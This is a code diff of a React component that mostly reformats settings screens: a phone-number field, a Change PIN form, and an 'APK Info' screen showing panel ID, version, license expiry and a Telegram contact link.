-                className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400"
-              />
-
+              <input value={globalPhone} onChange={e => setGlobalPhone(e.target.value)}
+                placeholder="Enter phone number" inputMode="tel"
+                className="mb-4 h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
               <button type="button" onClick={saveGlobalPhone} disabled={globalLoading}
                 className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white disabled:opacity-60">
                 {globalLoading ? "Saving…" : "Save"}
               </button>
               {globalMsg && <div className="mt-2 text-center text-[13px]">{globalMsg}</div>}
             </div>
-
-            {/* Change PIN */}
             <div className="rounded-2xl bg-white p-5 shadow-sm">
               <div className="mb-4 text-[15px] font-bold text-gray-900">Change PIN</div>
               {[
-                { label: "Old PIN",     val: pinOld,    set: setPinOld },
-                { label: "New PIN",     val: pinNew,    set: setPinNew },
+                { label: "Old PIN",     val: pinOld,     set: setPinOld },
+                { label: "New PIN",     val: pinNew,     set: setPinNew },
                 { label: "Confirm PIN", val: pinConfirm, set: setPinConfirm },
               ].map(f => (
                 <div key={f.label} className="mb-3">
                   <div className="mb-1 text-[12px] font-semibold text-gray-500">{f.label}</div>
-                  <input type="password" inputMode="numeric" value={f.val}
-                    onChange={e => f.set(e.target.value)}
+                  <input type="password" inputMode="numeric" value={f.val} onChange={e => f.set(e.target.value)}
                     className="h-12 w-full rounded-xl border border-gray-200 px-4 text-[14px] outline-none focus:border-gray-400" />
                 </div>
               ))}
               <button type="button" onClick={changePin}
-                className="mt-2 w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white">
-                Change PIN
-              </button>
+                className="mt-2 w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white">Change PIN</button>
               {pinMsg && <div className="mt-2 text-center text-[13px]">{pinMsg}</div>}
             </div>
           </div>
         </div>
       )}
 
-      {/* APK INFO SCREEN */}
+      {/* APK INFO */}
       {helpScreen === "apk" && (
         <div className="fixed inset-0 z-[1000] overflow-auto bg-[#f5f5f5]">
-          {/* Header */}
           <div className="sticky top-0 flex items-center gap-3 bg-white px-4 py-3 shadow-sm">
-            <button type="button" onClick={() => setHelpScreen("")}
-              className="text-[20px] text-gray-600">←</button>
+            <button type="button" onClick={() => setHelpScreen("")} className="text-[20px] text-gray-600">←</button>
             <span className="text-[17px] font-bold text-gray-900">APK Info</span>
           </div>
-
           <div className="mx-auto max-w-[480px] space-y-4 p-4">
             <div className="rounded-2xl bg-white p-5 shadow-sm space-y-4">
               {[
-                { label: "Panel ID",      value: str(ENV.PANEL_ID || "-") },
-                { label: "Version",       value: str(ENV.VERSION || "v1.0") },
-                { label: "Expiry Date",   value: licenseInfo?.expiryDate || "—" },
-                { label: "Status",        value: licenseInfo?.status || "Active" },
-                { label: "Contact (TG)",  value: str(ENV.TELEGRAM_CHANNEL || "-") },
+                { label: "Panel ID",     value: str(ENV.PANEL_ID || "-") },
+                { label: "Version",      value: str(ENV.VERSION || "v1.0") },
+                { label: "Expiry Date",  value: licenseInfo?.expiryDate || "—" },
+                { label: "Status",       value: licenseInfo?.status || "Active" },
+                { label: "Contact (TG)", value: str(ENV.TELEGRAM_CHANNEL || "-") },
               ].map(row => (
                 <div key={row.label}>
                   <div className="text-[12px] font-semibold text-gray-500">{row.label}</div>
@@ -1092,7 +1135,6 @@ export default function MainPage() {
                 </div>
               ))}
             </div>
-
             <button type="button" onClick={openTelegramHelp}
               className="w-full rounded-xl border-2 border-blue-500 py-3 text-[15px] font-semibold text-blue-600">
               Join Telegram Channel
